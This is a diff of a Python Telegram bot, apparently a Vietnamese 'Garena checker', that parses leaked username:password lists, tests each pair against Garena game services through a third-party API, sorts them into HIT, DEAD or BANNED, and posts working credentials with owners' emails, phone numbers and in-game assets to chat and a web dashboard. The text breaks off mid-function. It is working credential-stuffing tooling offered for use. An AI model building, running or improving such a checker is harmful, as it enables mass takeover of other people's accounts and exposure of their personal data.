-            -webkit-text-fill-color: transparent;
-        }}
-        .stat-card .label {{ color: #888; font-size: 0.85rem; margin-top: 5px; }}
-        .stat-card.hit .number {{ background: linear-gradient(135deg, #00ff88, #00cc66); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
-        .stat-card.dead .number {{ background: linear-gradient(135deg, #ff4444, #cc0000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
-        .stat-card.banned .number {{ background: linear-gradient(135deg, #ff8800, #cc6600); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
-        .stat-card.error .number {{ background: linear-gradient(135deg, #ff44ff, #cc00cc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
-        .stat-card.total .number {{ background: linear-gradient(135deg, #44aaff, #0066cc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
-        .stat-card.rate .number {{ background: linear-gradient(135deg, #ffdd00, #ffaa00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
-        
-        .row {{
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 30px;
-        }}
-        @media (max-width: 768px) {{ .row {{ grid-template-columns: 1fr; }} }}
-        
-        .section {{
-            background: rgba(255,255,255,0.03);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }}
-        .section h2 {{
-            color: #00ff88;
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }}
-        .section h2 .badge {{
-            background: rgba(0,255,136,0.15);
-            padding: 2px 10px;
-            border-radius: 15px;
-            font-size: 0.7rem;
-            color: #00ff88;
-        }}
-        
-        .chart-container {{ position: relative; height: 200px; }}
-        
-        .history-table {{
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.85rem;
-        }}
-        .history-table th {{
-            background: rgba(0,255,136,0.08);
-            color: #00ff88;
-            padding: 10px 12px;
-            text-align: left;
-            border-bottom: 2px solid rgba(0,255,136,0.2);
-        }}
-        .history-table td {{
-            padding: 8px 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }}
-        .history-table tr:hover td {{ background: rgba(255,255,255,0.03); }}
-        .hit-count {{ color: #00ff88; font-weight: bold; }}
-        .dead-count {{ color: #ff4444; font-weight: bold; }}
-        .banned-count {{ color: #ff8800; font-weight: bold; }}
-        .error-count {{ color: #ff44ff; font-weight: bold; }}
-        
-        .hit-list {{
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 6px;
-            max-height: 400px;
-            overflow-y: auto;
-        }}
-        .hit-item {{
-            background: rgba(0,255,136,0.05);
-            border: 1px solid rgba(0,255,136,0.1);
-            border-radius: 8px;
-            padding: 8px 12px;
-            font-size: 0.8rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.2s;
-        }}
-        .hit-item:hover {{
-            background: rgba(0,255,136,0.08);
-            border-color: rgba(0,255,136,0.3);
-        }}
-        .hit-item .acc {{
-            color: #fff;
-            font-family: 'Courier New', monospace;
-            font-size: 0.75rem;
-        }}
-        .hit-item .service {{
-            color: #888;
-            font-size: 0.7rem;
-            background: rgba(255,255,255,0.05);
-            padding: 2px 8px;
-            border-radius: 10px;
-        }}
-        .hit-item .time {{ color: #555; font-size: 0.65rem; }}
-        
-        .top-list {{
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 4px;
-        }}
-        .top-item {{
-            display: flex;
-            justify-content: space-between;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 0.8rem;
-        }}
-        .top-item:hover {{ background: rgba(255,255,255,0.03); }}
-        .top-item .name {{ color: #aaa; }}
-        .top-item .value {{ color: #00ff88; font-weight: bold; }}
-        
-        .footer {{
-            text-align: center;
-            padding: 20px;
-            color: #555;
-            border-top: 1px solid rgba(255,255,255,0.05);
-            margin-top: 30px;
-            font-size: 0.85rem;
-        }}
-        .footer a {{ color: #00ff88; text-decoration: none; }}
-        
-        ::-webkit-scrollbar {{ width: 6px; }}
-        ::-webkit-scrollbar-track {{ background: rgba(255,255,255,0.03); border-radius: 10px; }}
-        ::-webkit-scrollbar-thumb {{ background: rgba(0,255,136,0.3); border-radius: 10px; }}
-        ::-webkit-scrollbar-thumb:hover {{ background: rgba(0,255,136,0.5); }}
-        
-        .refresh-info {{
-            text-align: center;
-            color: #444;
-            font-size: 0.75rem;
-            margin-top: 10px;
-        }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🎮 GARENA CHECKER BOT V7.0</h1>
-            <p>Hệ thống kiểm tra tài khoản tự động</p>
-            <span class="status-badge {"running" if checking else "stopped"}">
-                {"🟢 ĐANG CHẠY" if checking else "🔴 DỪNG"}
-            </span>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card total">
-                <div class="icon">📊</div>
-                <div class="number">{total:,}</div>
-                <div class="label">Tổng đã check</div>
-            </div>
-            <div class="stat-card hit">
-                <div class="icon">✅</div>
-                <div class="number">{hits_count:,}</div>
-                <div class="label">HIT</div>
-            </div>
-            <div class="stat-card dead">
-                <div class="icon">❌</div>
-                <div class="number">{stats_data.get("total_dead", 0):,}</div>
-                <div class="label">DEAD</div>
-            </div>
-            <div class="stat-card banned">
-                <div class="icon">🚫</div>
-                <div class="number">{stats_data.get("total_banned", 0):,}</div>
-                <div class="label">BANNED</div>
-            </div>
-            <div class="stat-card error">
-                <div class="icon">⚠️</div>
-                <div class="number">{stats_data.get("total_errors", 0):,}</div>
-                <div class="label">ERROR</div>
-            </div>
-            <div class="stat-card rate">
-                <div class="icon">📈</div>
-                <div class="number">{hit_rate}%</div>
-                <div class="label">Tỷ lệ HIT</div>
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="section">
-                <h2>📈 Biểu đồ 7 ngày <span class="badge">HIT/DEAD</span></h2>
-                <div class="chart-container">
-                    <canvas id="dailyChart"></canvas>
-                </div>
-            </div>
-            <div class="section">
-                <h2>🏆 Top Services <span class="badge">HIT nhiều nhất</span></h2>
-                <div class="top-list">
-                    {"".join(f'''
-                    <div class="top-item">
-                        <span class="name">{SERVICE_ROUTES.get(s, {}).get("icon", "❓")} {SERVICE_ROUTES.get(s, {}).get("desc", s)}</span>
-                        <span class="value">{d.get("hits", 0)} HIT</span>
-                    </div>
-                    ''' for s, d in top_services)}
-                    {"<div style='color:#555;text-align:center;padding:10px;'>Chưa có dữ liệu</div>" if not top_services else ""}
-                </div>
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="section">
-                <h2>👑 Top Users <span class="badge">Nhiều HIT nhất</span></h2>
-                <div class="top-list">
-                    {"".join(f'''
-                    <div class="top-item">
-                        <span class="name">{user}</span>
-                        <span class="value">{data.get("count", 0)} HIT</span>
-                    </div>
-                    ''' for user, data in top_users)}
-                    {"<div style='color:#555;text-align:center;padding:10px;'>Chưa có dữ liệu</div>" if not top_users else ""}
-                </div>
-            </div>
-            <div class="section">
-                <h2>📋 Lịch sử gần đây <span class="badge">{len(history)} bản ghi</span></h2>
-                <div style="max-height:300px;overflow-y:auto;">
-                    <table class="history-table">
-                        <thead>
-                            <tr>
-                                <th>Thời gian</th>
-                                <th>Tổng</th>
-                                <th>HIT</th>
-                                <th>DEAD</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            {"".join(f'''
-                            <tr>
-                                <td>{h.get("time", "")[5:16]}</td>
-                                <td>{h.get("total", 0)}</td>
-                                <td class="hit-count">{h.get("hits", 0)}</td>
-                                <td class="dead-count">{h.get("dead", 0)}</td>
-                            </tr>
-                            ''' for h in history)}
-                            {"<tr><td colspan='4' style='text-align:center;color:#555;'>Chưa có lịch sử</td></tr>" if not history else ""}
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-        
-        <div class="section">
-            <h2>🎯 HIT gần đây <span class="badge">{len(hits)} tài khoản</span></h2>
-            <div class="hit-list">
-                {"".join(f'''
-                <div class="hit-item">
-                    <span class="acc">{h.get("user", "")}:{h.get("pwd", "")}</span>
-                    <span class="service">{h.get("service", "")}</span>
-                    <span class="time">{h.get("time", "")[5:16]}</span>
-                </div>
-                ''' for h in hits[-30:][::-1])}
-                {"<div style='color:#555;text-align:center;padding:20px;'>Chưa có HIT nào</div>" if not hits else ""}
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>Admin: <a href="https://t.me/baohuyno1">@baohuyno1</a> | Bot V7.0</p>
-            <p class="refresh-info">🔄 Tự động làm mới mỗi 15 giây</p>
-        </div>
-    </div>
-    <script>
-        // Chart
-        const ctx = document.getElementById('dailyChart').getContext('2d');
-        const dailyData = {json.dumps(last_7_days)};
-        const labels = [];
-        for(let i = 6; i >= 0; i--) {{
-            const d = new Date();
-            d.setDate(d.getDate() - i);
-            labels.push(d.toLocaleDateString('vi-VN', {{day:'2-digit', month:'2-digit'}}));
-        }}
-        new Chart(ctx, {{
-            type: 'bar',
-            data: {{
-                labels: labels,
-                datasets: [
-                    {{
-                        label: 'HIT',
-                        data: dailyData.map(d => d.hits || 0),
-                        backgroundColor: 'rgba(0, 255, 136, 0.6)',
-                        borderColor: '#00ff88',
-                        borderWidth: 1,
-                        borderRadius: 4
-                    }},
-                    {{
-                        label: 'DEAD',
-                        data: dailyData.map(d => d.dead || 0),
-                        backgroundColor: 'rgba(255, 68, 68, 0.6)',
-                        borderColor: '#ff4444',
-                        borderWidth: 1,
-                        borderRadius: 4
-                    }}
-                ]
-            }},
-            options: {{
-                responsive: true,
-                maintainAspectRatio: false,
-                plugins: {{
-                    legend: {{
-                        labels: {{ color: '#888', font: {{ size: 11 }} }}
-                    }}
-                }},
-                scales: {{
-                    y: {{
-                        beginAtZero: true,
-                        ticks: {{ color: '#555', font: {{ size: 10 }} }}
-                    }},
-                    x: {{
-                        ticks: {{ color: '#555', font: {{ size: 10 }} }}
-                    }}
-                }}
-            }}
-        }});
-        
-        // Auto refresh
-        setTimeout(function() {{ location.reload(); }}, 15000);
-    </script>
-</body>
-</html>'''
-            self.wfile.write(html.encode('utf-8'))
-        else:
-            self.send_response(404)
-            self.end_headers()
-
-def run_web_server():
-    try:
-        server = HTTPServer(('0.0.0.0', WEB_PORT), StatsHandler)
-        print(f"[+] Web server chạy tại http://0.0.0.0:{WEB_PORT}")
-        server.serve_forever()
-    except Exception as e:
-        print(f"[!] Web server error: {e}")
-
-threading.Thread(target=run_web_server, daemon=True).start()
-
-# ========== TELEGRAM BOT FUNCTIONS ==========
+# ========== UTILITY FUNCTIONS ==========
 def rate_limit(delay=DEFAULT_DELAY):
     global last_request_time
     with rate_lock:
         current_time = time.time()
         time_since_last = current_time - last_request_time
         if time_since_last < delay:
-            sleep_time = delay - time_since_last
-            time.sleep(sleep_time)
+            time.sleep(delay - time_since_last)
         last_request_time = time.time()
 
 def fix_encoding(text):
@@ -737,32 +777,18 @@ def fix_encoding(text):
 
 def is_user_member(user_id):
     try:
-        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
-        status = chat_member.status
+        status = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id).status
         return status in ['member', 'administrator', 'creator']
     except:
         return False
 
 def check_membership(message):
-    user_id = message.from_user.id
-    if is_user_member(user_id):
+    if is_user_member(message.from_user.id):
         return True
     markup = telebot.types.InlineKeyboardMarkup()
-    join_button = telebot.types.InlineKeyboardButton(
-        text="📢 THAM GIA KENH BAT BUOC",
-        url=REQUIRED_CHANNEL_URL
-    )
-    check_button = telebot.types.InlineKeyboardButton(
-        text="✅ TOI DA THAM GIA",
-        callback_data="check_join"
-    )
-    markup.add(join_button)
-    markup.add(check_button)
-    bot.send_message(
-        message.chat.id,
-        f"🔒 BAN CHUA THAM GIA KENH BAT BUOC!\n\n📢 Vui long tham gia: {REQUIRED_CHANNEL}",
-        reply_markup=markup
-    )
+    markup.add(telebot.types.InlineKeyboardButton("📢 THAM GIA KENH", url=REQUIRED_CHANNEL_URL))
+    markup.add(telebot.types.InlineKeyboardButton("✅ XAC NHAN", callback_data="check_join"))
+    bot.send_message(message.chat.id, f"🔒 BAN CHUA THAM GIA KENH BAT BUOC!\n📢 {REQUIRED_CHANNEL}", reply_markup=markup)
     return False
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_join")
@@ -774,38 +800,28 @@ def callback_check_join(call):
     else:
         bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)
 
-def delete_later(chat_id, message_id, delay=5):
-    time.sleep(delay)
-    try:
-        bot.delete_message(chat_id, message_id)
-    except:
-        pass
-
-def safe_send_message(chat_id, text, parse_mode="HTML", auto_delete=False, delete_after=10):
+def safe_send_message(chat_id, text, parse_mode="HTML"):
     if not text:
-        return None
-    text = fix_encoding(text)
-    try:
-        msg = bot.send_message(chat_id, text, parse_mode=parse_mode)
-        if auto_delete:
-            threading.Thread(target=delete_later, args=(chat_id, msg.message_id, delete_after), daemon=True).start()
-        return msg
-    except:
-        try:
-            msg = bot.send_message(chat_id, text)
-            if auto_delete:
-                threading.Thread(target=delete_later, args=(chat_id, msg.message_id, delete_after), daemon=True).start()
-            return msg
-        except:
-            return None
-
-def safe_delete_message(chat_id, message_id):
-    if not message_id:
         return
-    try:
-        bot.delete_message(chat_id, message_id)
-    except:
-        pass
+    text = fix_encoding(text)
+    if len(text) > MAX_MESSAGE_LENGTH:
+        parts = []
+        for line in text.split('\n'):
+            if not parts or len(parts[-1]) + len(line) + 1 > MAX_MESSAGE_LENGTH:
+                parts.append(line)
+            else:
+                parts[-1] += '\n' + line
+        for part in parts:
+            try:
+                bot.send_message(chat_id, part, parse_mode=parse_mode)
+                time.sleep(0.1)
+            except:
+                pass
+    else:
+        try:
+            bot.send_message(chat_id, text, parse_mode=parse_mode)
+        except:
+            pass
 
 def is_valid_account(user, pwd):
     if len(user) < 2 or len(pwd) < 1:
@@ -819,49 +835,19 @@ def is_valid_account(user, pwd):
     return True
 
 def loc_tk_mk_only(content):
-    accounts = []
-    seen = set()
-    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
-    if not content:
-        return accounts, stats_loc
-    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
-    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
-    lines = content.split('\n')
-    stats_loc["total"] = len(lines)
-    for line in lines:
+    accounts, seen = [], set()
+    pattern = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})[:|]([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
+    for line in content.split('\n'):
         line = line.strip()
-        if not line:
+        if not line or re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
             continue
-        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
-            continue
-        matches = re.findall(pattern_colon, line)
-        if matches:
-            for user, pwd in matches:
-                if is_valid_account(user, pwd):
-                    key = f"{user}:{pwd}"
-                    if key not in seen:
-                        seen.add(key)
-                        accounts.append((user, pwd))
-                        stats_loc["valid"] += 1
-                    else:
-                        stats_loc["duplicate"] += 1
-                else:
-                    stats_loc["invalid"] += 1
-            continue
-        matches = re.findall(pattern_pipe, line)
-        if matches:
-            for user, pwd in matches:
-                if is_valid_account(user, pwd):
-                    key = f"{user}:{pwd}"
-                    if key not in seen:
-                        seen.add(key)
-                        accounts.append((user, pwd))
-                        stats_loc["valid"] += 1
-                    else:
-                        stats_loc["duplicate"] += 1
-                else:
-                    stats_loc["invalid"] += 1
-    return accounts, stats_loc
+        for user, pwd in re.findall(pattern, line):
+            if is_valid_account(user, pwd):
+                key = f"{user}:{pwd}"
+                if key not in seen:
+                    seen.add(key)
+                    accounts.append((user, pwd))
+    return accounts, {"total": len(content.split('\n')), "valid": len(accounts)}
 
 def save_loc_file(accounts):
     with file_lock:
@@ -873,467 +859,326 @@ def should_skip_field(value):
     if value is None:
         return True
     if isinstance(value, str):
-        value_lower = value.lower().strip()
-        if value_lower in ["", "no", "none", "null", "n/a", "chưa xác thực", "chua xac thuc", "0", "0.0", "false"]:
+        v = value.lower().strip()
+        if v in ["", "no", "none", "null", "n/a", "chưa xác thực", "chua xac thuc", "0", "0.0", "false"]:
             return True
-        if any(word in value_lower for word in ["chưa", "chua", "no", "none", "null"]):
-            if "email" in value_lower or "pass" in value_lower or "cccd" in value_lower or "authen" in value_lower:
-                return True
         return False
     if isinstance(value, (int, float)):
-        if value == 0:
-            return False
+        return value == 0
     if isinstance(value, bool):
-        if value is False:
-            return True
+        return not value
+    if isinstance(value, (list, dict)):
+        return not value
     return False
 
+# ========== API CHECK ==========
 def check_account_api(username, password, service, use_delay=True):
     if use_delay:
         rate_limit(DEFAULT_DELAY)
+    
     cache_key = f"{username}:{password}:{service}"
     with cache_lock:
         if cache_key in cache_results:
             return cache_results[cache_key]
+    
     service_info = SERVICE_ROUTES.get(service, {})
-    route = service_info.get("route", "/api/lienquan")
-    param_names = service_info.get("params", ["tk", "mk"])
-    url = f"{API_BASE}{route}"
     params = {"username": API_USERNAME, "password": API_PASSWORD}
-    if len(param_names) >= 2:
-        params[param_names[0]] = username
-        params[param_names[1]] = password
-    else:
-        params["tk"] = username
-        params["mk"] = password
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "Connection": "keep-alive"
-    }
+    params[service_info.get("params", ["tk", "mk"])[0]] = username
+    params[service_info.get("params", ["tk", "mk"])[1]] = password
+    
     for attempt in range(DEFAULT_RETRIES):
         try:
-            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
+            resp = requests.get(f"{API_BASE}{service_info.get('route', '/api/lienquan')}", 
+                              params=params, timeout=DEFAULT_TIMEOUT)
             if resp.status_code == 200:
                 try:
-                    result_data = resp.json()
-                    if isinstance(result_data, dict):
-                        for key, value in result_data.items():
-                            if isinstance(value, str):
-                                result_data[key] = fix_encoding(value)
-                        is_hit = False
+                    data = resp.json()
+                    if isinstance(data, dict):
+                        for k, v in data.items():
+                            if isinstance(v, str):
+                                data[k] = fix_encoding(v)
+                        
                         is_banned = False
-                        banned_fields = ["banned", "ban", "aov_banned"]
-                        for field in banned_fields:
-                            if field in result_data:
-                                val = result_data[field]
-                                if isinstance(val, bool) and val:
-                                    is_banned = True
-                                    break
-                                elif isinstance(val, str) and val.upper() in ["YES", "TRUE", "BANNED", "BAN"]:
+                        for field in ["banned", "ban", "aov_banned"]:
+                            if field in data:
+                                val = data[field]
+                                if (isinstance(val, bool) and val) or (isinstance(val, str) and val.upper() in ["YES", "TRUE", "BANNED"]):
                                     is_banned = True
                                     break
                         if is_banned:
-                            result_data["result"] = "banned"
-                            result_data["_is_banned"] = True
+                            data["result"] = "banned"
                             with cache_lock:
-                                cache_results[cache_key] = result_data
-                            return result_data
-                        status_val = result_data.get("status")
-                        if status_val is not None:
-                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
-                                is_hit = True
-                        success_val = result_data.get("success")
-                        if not is_hit and success_val is not None:
-                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
-                                is_hit = True
-                        result_val = result_data.get("result")
-                        if result_val is not None:
-                            result_str = str(result_val).lower()
-                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
-                                is_hit = True
-                        data_val = result_data.get("data")
-                        if data_val is not None:
-                            if isinstance(data_val, (dict, list, str)) and data_val:
-                                is_hit = True
-                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt", "shells", "aov_name", "aov_rank", "aov_level", "aov_total_skins", "aov_total_champs", "fc_name", "fc_ovr", "garena_created", "last_login", "region", "aov_ss", "aov_sss", "aov_anime", "aov_qh", "nap_so", "fb", "tinh_trang", "ngay_tao_tk", "aov_ss_list", "aov_anime_list", "aov_other_list"]
+                                cache_results[cache_key] = data
+                            return data
+                        
+                        is_hit = False
+                        if data.get("status") in [True, "true", 1, "1", "success", "HIT", "hit"]:
+                            is_hit = True
+                        if data.get("success") in [True, "true", 1, "1"]:
+                            is_hit = True
+                        if str(data.get("result", "")).lower() in ["hit", "true", "success", "valid", "live"]:
+                            is_hit = True
+                        if data.get("data") and isinstance(data.get("data"), (dict, list, str)):
+                            is_hit = True
+                        
+                        info_fields = ["uid", "id", "name", "nickname", "email", "phone", "sdt", "shells", 
+                                      "aov_name", "aov_rank", "aov_level", "aov_total_skins", "aov_total_champs",
+                                      "fc_name", "fc_ovr", "garena_created", "last_login", "region"]
                         for field in info_fields:
-                            if field in result_data and result_data[field] is not None and result_data[field] != "":
+                            if field in data and data[field] not in [None, "", "N/A"]:
                                 is_hit = True
                                 break
-                        result_data["result"] = "hit" if is_hit else "dead"
-                        result_data["_is_banned"] = False
+                        
+                        data["result"] = "hit" if is_hit else "dead"
                         with cache_lock:
-                            cache_results[cache_key] = result_data
-                        return result_data
+                            cache_results[cache_key] = data
+                        return data
                 except:
                     pass
-            elif resp.status_code == 429:
-                time.sleep(5)
-                continue
-            else:
-                time.sleep(2)
+            time.sleep(2)
         except:
             time.sleep(3)
-    result = {"result": "error", "_error": "All retries failed"}
+    
+    result = {"result": "error"}
     with cache_lock:
         cache_results[cache_key] = result
     return result
 
-def format_full_info_compact(username, password, service, result_data):
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
+# ========== FORMAT HIT ==========
+def format_hit_info(username, password, service, data):
+    line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
+    desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     
-    msg = f"{icon} <b>HIT - {service_desc}</b>\n"
+    msg = f"{line}\n{icon} <b>HIT - {desc}</b>\n{line}\n"
     msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
     
-    if isinstance(result_data, dict):
-        field_display = {
-            "uid": "🆔 UID",
-            "id": "🆔 ID",
-            "name": "👤 Name",
-            "nickname": "👤 Nickname",
-            "account": "👤 Account",
-            "user": "👤 User",
-            "player": "👤 Player",
-            "email": "📧 Email",
-            "phone": "📱 Phone",
-            "sdt": "📱 SĐT",
-            "fb": "📘 Facebook",
-            "region": "🌍 Region",
-            "shells": "💰 Shells",
-            "nap_so": "💎 Nạp số",
-            "level": "📊 Level",
-            "rank": "🏆 Rank",
-            "aov_name": "🎮 Tên LQ",
-            "aov_rank": "🏅 Rank LQ",
-            "aov_level": "📊 Level LQ",
-            "aov_total_skins": "👗 Skin LQ",
-            "aov_total_champs": "⚔️ Tướng LQ",
-            "aov_qh": "❤️ QH LQ",
-            "aov_ss": "⭐ SS LQ",
-            "aov_sss": "⭐⭐⭐ SSS LQ",
-            "aov_anime": "🎌 Anime LQ",
-            "fc_name": "⚽ Tên FC",
-            "fc_ovr": "📊 OVR FC",
-            "garena_created": "📅 Tạo GR",
-            "last_login": "🕐 Login cuối",
-            "tinh_trang": "📌 Tình trạng",
-            "ngay_tao_tk": "📅 Ngày tạo",
-        }
-        
-        info_lines = []
-        for key, label in field_display.items():
-            if key in result_data:
-                value = result_data[key]
-                if should_skip_field(value):
-                    continue
-                if isinstance(value, bool):
-                    value = "✅ Có" if value else "❌ Không"
-                if isinstance(value, str):
-                    value = fix_encoding(value)
-                info_lines.append(f"{label}: {value}")
-        
-        if info_lines:
-            msg += "\n" + "\n".join(info_lines)
-        
-        list_fields = [
-            ("✨ SS List", "aov_ss_list"),
-            ("🔥 Anime List", "aov_anime_list"),
-            ("🎲 Other List", "aov_other_list")
-        ]
-        
-        for label, field in list_fields:
-            if field in result_data and result_data[field]:
-                value = result_data[field]
-                if isinstance(value, list) and value:
-                    value = [fix_encoding(str(item)) for item in value]
-                    msg += f"\n\n{label}:"
-                    for item in value[:20]:
-                        msg += f"\n  • {item}"
-                    if len(value) > 20:
-                        msg += f"\n  ... +{len(value) - 20} items"
+    field_map = {
+        "uid": "🆔 UID",
+        "id": "🆔 ID",
+        "name": "👤 Name",
+        "nickname": "👤 Nickname",
+        "email": "📧 Email",
+        "phone": "📱 Phone",
+        "sdt": "📱 SĐT",
+        "fb": "📘 Facebook",
+        "region": "🌍 Region",
+        "shells": "💰 Shells",
+        "nap_so": "💎 Nạp số",
+        "level": "📊 Level",
+        "rank": "🏆 Rank",
+        "aov_name": "🔥 Tên LQ",
+        "aov_rank": "👑 Rank LQ",
+        "aov_level": "✨ Level LQ",
+        "aov_total_skins": "💎 Skin LQ",
+        "aov_total_champs": "💪 Tướng LQ",
+        "aov_qh": "❤️ QH LQ",
+        "aov_ss": "⭐ SS LQ",
+        "aov_sss": "🔥 SSS LQ",
+        "aov_anime": "🎌 Anime LQ",
+        "fc_name": "⚽ Tên FC",
+        "fc_ovr": "📊 OVR FC",
+        "garena_created": "📅 Tạo GR",
+        "last_login": "⏰ Login cuối",
+        "tinh_trang": "📋 Tình Trạng",
+        "ngay_tao_tk": "📅 Ngày tạo",
+        "email_verified": "📩 EMAIL",
+        "mobile_bound": "📱 SĐT",
+        "password_set": "🛡 PASS",
+        "banned": "🚫 BAND",
+        "ban_until": "🚫 BAND Den"
+    }
     
+    info_lines = []
+    for key, label in field_map.items():
+        if key in data:
+            value = data[key]
+            if should_skip_field(value):
+                continue
+            if isinstance(value, bool):
+                value = "✅ Có" if value else "❌ Không"
+            if isinstance(value, str):
+                value = fix_encoding(value)
+            info_lines.append(f"{label}: {value}")
+    
+    list_fields = [
+        ("aov_ss_list", "✨ SS List"),
+        ("aov_sss_list", "🔥 SSS List"),
+        ("aov_anime_list", "🎌 Anime List"),
+        ("aov_other_list", "🎲 Other List")
+    ]
+    
+    for field, label in list_fields:
+        if field in data and isinstance(data[field], list) and data[field]:
+            items = [fix_encoding(str(i)) for i in data[field] if i]
+            if items:
+                info_lines.append(f"\n{label}:")
+                for item in items[:30]:
+                    info_lines.append(f"  • {item}")
+                if len(items) > 30:
+                    info_lines.append(f"  ... +{len(items)-30} items")
+    
+    if info_lines:
+        msg += "\n" + "\n".join(info_lines)
+    
+    msg += f"\n\n{line}"
     return msg
 
-def format_dead_info(username, password, service):
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
-    icon = SERVICE_ROUTES.get(service, {}).get("icon", "❌")
-    return f"{icon} <b>DEAD - {service_desc}</b>\n🔑 <code>{username}:{password}</code>"
-
-def format_error_info(username, password, service):
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
-    icon = SERVICE_ROUTES.get(service, {}).get("icon", "⚠️")
-    return f"{icon} <b>ERROR - {service_desc}</b>\n🔑 <code>{username}:{password}</code>"
-
-def check_single(chat_id, username, password, service="lienquan", cmd_msg=None):
-    if cmd_msg:
-        threading.Thread(target=delete_later, args=(chat_id, cmd_msg.message_id, 2), daemon=True).start()
-    
+# ========== CHECK FUNCTIONS ==========
+def check_single(chat_id, username, password, service="lienquan"):
     result = check_account_api(username, password, service, use_delay=False)
     result_type = result.get("result", "unknown")
-    is_banned = result.get("_is_banned", False)
-    if is_banned or result_type == "banned":
+    
+    if result_type == "banned":
+        safe_send_message(chat_id, f"🚫 <b>BANNED</b>\n🔑 <code>{username}:{password}</code>")
         update_stats(banned_count=1, service=service)
-        return
-    if result_type == "hit":
-        hit_msg = format_full_info_compact(username, password, service, result)
-        safe_send_message(chat_id, hit_msg)
+    elif result_type == "hit":
+        safe_send_message(chat_id, format_hit_info(username, password, service, result))
         update_stats(hit_count=1, hit_details=[{"user": username, "pwd": password, "service": service, "time": datetime.now().isoformat()}], service=service)
     elif result_type == "dead":
-        safe_send_message(chat_id, format_dead_info(username, password, service))
+        safe_send_message(chat_id, f"❌ <b>DEAD - {SERVICE_ROUTES.get(service, {}).get('desc', service)}</b>\n🔑 <code>{username}:{password}</code>")
         update_stats(dead_count=1, service=service)
     else:
-        safe_send_message(chat_id, format_error_info(username, password, service))
+        safe_send_message(chat_id, f"⚠️ <b>ERROR - {SERVICE_ROUTES.get(service, {}).get('desc', service)}</b>\n🔑 <code>{username}:{password}</code>")
         update_stats(error_count=1, service=service)
 
-def check_batch(chat_id, accounts, service, cmd_msg=None):
-    global checking, stats, last_progress_msg, last_batch_msg
-    
-    if cmd_msg:
-        threading.Thread(target=delete_later, args=(chat_id, cmd_msg.message_id, 2), daemon=True).start()
-    
+def check_batch(chat_id, accounts, service):
+    global checking, stats
     if checking:
-        safe_send_message(chat_id, "⚠️ Dang check roi!", auto_delete=True, delete_after=5)
+        safe_send_message(chat_id, "⚠️ Dang check roi!")
         return
+    
     checking = True
     stop_event.clear()
     total = len(accounts)
-    stats = {
-        "total": total,
-        "checked": 0,
-        "hits": 0,
-        "dead": 0,
-        "errors": 0,
-        "banned": 0,
-        "unknown": 0,
-        "start_time": time.time()
-    }
-    batches = []
-    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
-        batch = accounts[i:i + CHECKMULTI_BATCH_SIZE]
-        batches.append(batch)
-    total_batches = len(batches)
-    batch_num = 0
-    all_results = []
+    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": time.time()}
     hit_details = []
-    last_progress_msg = None
-    last_batch_msg = None
-
-    def process_single(user, pwd):
-        if stop_event.is_set():
-            return
-        rate_limit(CHECKMULTI_DELAY)
-        result = check_account_api(user, pwd, service, use_delay=False)
-        result_type = result.get("result", "unknown")
